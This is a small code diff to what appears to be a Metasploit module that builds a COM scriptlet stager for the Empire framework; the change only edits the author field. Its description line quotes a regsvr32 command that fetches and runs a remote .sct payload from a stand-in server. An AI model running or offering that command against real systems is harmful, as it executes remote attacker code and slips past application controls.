@@ -21,7 +21,7 @@ module MetasploitModule
     super(merge_info(info,
     'Name'       => 'Empire Stager Module',
     'Description'=> 'Creates a SCT (COM Scriptlet) Payload for Empire, On the endpoint simply launch regsvr32 /u /n /s /i:http://server/file.sct scrobj.dll',
-    'Author'     => ['author_name'],
+    'Author'     => ['zed009'],
     'License'    => MSF_LICENSE,
     'Platform'   => ['empire'],
     'Arch'       => ARCH_CMD,
